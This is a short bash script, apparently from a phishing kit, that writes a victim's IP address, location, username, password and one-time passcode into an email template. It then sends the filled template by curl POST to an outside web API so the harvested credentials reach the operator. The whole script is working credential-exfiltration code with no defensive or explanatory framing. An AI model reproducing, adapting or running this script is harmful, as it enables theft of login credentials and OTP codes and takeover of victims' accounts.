#!/bin/bash

pro_dir=$(pwd)
email_dir="${pro_dir}/assets/email"
#email_dir="$pro_dir"

ip=${4}
loc=${5}
username=${6}
password=${7}
otp=${8}

if [ -z "${ip}" ] || [ "${ip}" == " " ]; then
    ip="NaN"
fi
if [ -z "${loc}" ] || [ "${loc}" == " " ]; then
    loc="NaN"
fi
if [ -z "${username}" ] || [ "${username}" == " " ]; then
    username="NaN"
fi
if [ -z "${password}" ] || [ "${password}" == " " ]; then
    password="NaN"
fi
if [ -z "${otp}" ] || [ "${otp}" == " " ]; then
    otp="NaN"
fi

# Replace placeholders in email.json with actual values
sed -i "s/replace_my_email/$1/" "${email_dir}/email.json"
sed -i "s/replace_server/$2/" "${email_dir}/email.json"
sed -i "s/replace_site/$3/" "${email_dir}/email.json"
sed -i "s/replace_ip/$ip/" "${email_dir}/email.json"
sed -i "s/replace_loc/$loc/" "${email_dir}/email.json"
sed -i "s/replace_victim_username/$username/" "${email_dir}/email.json"
sed -i "s/replace_victim_password/$password/" "${email_dir}/email.json"    
sed -i "s/replace_victim_otp/$otp/" "${email_dir}/email.json"

json_payload=$(cat ${email_dir}/email.json)

echo $json_payload

response=$(curl -sL -X POST -H "Content-Type: application/json" -d "$json_payload" http://clifty-api.vercel.app/api/sendEmail)

echo $response

EmailSuccess=$(echo "$response" | sed -n 's/.*"sendEmail":\([^,}]*\).*/\1/p')

# Echo the email_success value
echo "$EmailSuccess"
